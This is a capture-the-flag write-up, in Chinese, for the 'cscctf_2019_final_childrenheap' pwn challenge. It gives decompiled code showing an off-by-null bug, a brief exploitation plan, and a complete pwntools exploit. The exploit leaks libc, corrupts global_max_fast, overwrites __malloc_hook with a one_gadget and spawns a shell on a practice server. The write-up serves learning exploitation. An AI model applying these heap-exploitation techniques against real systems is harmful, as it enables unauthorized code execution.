# cscctf_2019_final_childrenheap

## 漏洞

```c
unsigned __int64 update()
{
  char *v0; // rax
  unsigned int index; // eax
  __int64 id; // rbx
  _BYTE *ptr; // rbp
  unsigned __int64 result; // rax
  char v5[24]; // [rsp+0h] [rbp-38h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-20h]

  v6 = __readfsqword(0x28u);
  __printf_chk(1LL, "Index: ");
  v0 = fgets(v5, 16, stdin);
  index = strtol(v0, 0LL, 10);
  if ( index > 0xF )
    error("Invalid index!");
  id = (int)index;
  if ( !heap_ptr[index]
    || (__printf_chk(1LL, "Content: "),
        ptr = (_BYTE *)heap_ptr[id],
        ptr[read(0, ptr, (int)size_ptr[id])] = 0,
        (result = __readfsqword(0x28u) ^ v6) != 0) )
  {
    error("Index is not allocated!");
  }
  return result;
}
```
Off-by-null，但是禁用了fastbin

利用思路是利用off-by-null打overlapping，然后unsortedbin attack打max_fast，这样子再创建堆删除堆的时候就会直接进入fastbin了

## exp

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './cscctf_2019_final_childrenheap'

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

context.terminal = ['tmux','splitw','-h']

debug = 1
if debug:
    r = remote('node4.buuoj.cn', 29984)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

def dbgg():
    raw_input()

menu = '>> '

def add(index, size, content):
    r.sendlineafter(menu, '1')
    r.sendlineafter('Index: ', str(index))
    r.sendlineafter('Size: ', str(size))
    r.sendafter('Content: ', content)

def show(index):
    r.sendlineafter(menu, '3')
    r.sendlineafter('Index: ', str(index))

def edit(index, content):
    r.sendlineafter(menu, '2')
    r.sendlineafter('Index: ', str(index))
    r.sendafter('Content: ', content)

def delete(index):
    r.sendlineafter(menu, '4')
    r.sendlineafter('Index: ', str(index))

dbgg()

for i in range(4):
    add(i, 0xf8, 'a')

add(4, 0xf8, 'aaaa')
add(5, 0x68, 'aaaa')
add(6, 0xf8, 'aaaa')
add(7, 0x60, 'aaaa')

delete(0)

p1 = b'a' * 0xf0 + p64(0x200)
edit(1, p1)

delete(2)

add(0, 0xf8, 'aaaa')
show(1)

malloc_hook = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 88 - 0x10
li('malloc_hook = ' + hex(malloc_hook))

#libc = ELF('./2.23/libc-2.23.so')
libc = ELF('./libc-2.23.so')
libc_base = malloc_hook - libc.sym['__malloc_hook']
li('libc_base = ' + hex(libc_base))
_IO_list_all = libc_base + libc.sym['_IO_list_all']
li('_IO_list_all = ' + hex(_IO_list_all))

#one = [0x45226, 0x4526a, 0xf03a4, 0xf1247]
one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_gadget = one[2] + libc_base
bin_sh = libc_base + libc.search(b'/bin/sh').__next__()
IO_str_jumps_addr = libc.sym['_IO_file_jumps'] + libc_base
system_addr = libc_base + libc.sym['system']
global_max_fast = libc_base + 0x3c67f8#libc.sym['global_max_fast']
li('global_max_fast = ' + hex(global_max_fast))

add(2, 0x10, 'a')
p1 = p64(0) * 3
p1 += p64(0x71) + p64(0)
p1 += p64(global_max_fast - 0x10)
p1 = p1.ljust(0x88, b'\x00')
p1 += p64(0x71)
edit(1, p1)

add(8, 0x60, 'aaa')
delete(8)

edit(1, p64(0) * 3 + p64(0x71) + p64(malloc_hook - 0x23))
add(9, 0x60, 'aaaa')

p2 = b'\x00' * 0x13 + p64(one_gadget)
add(10, 0x60, p2)

delete(1)
delete(2)

r.interactive()
```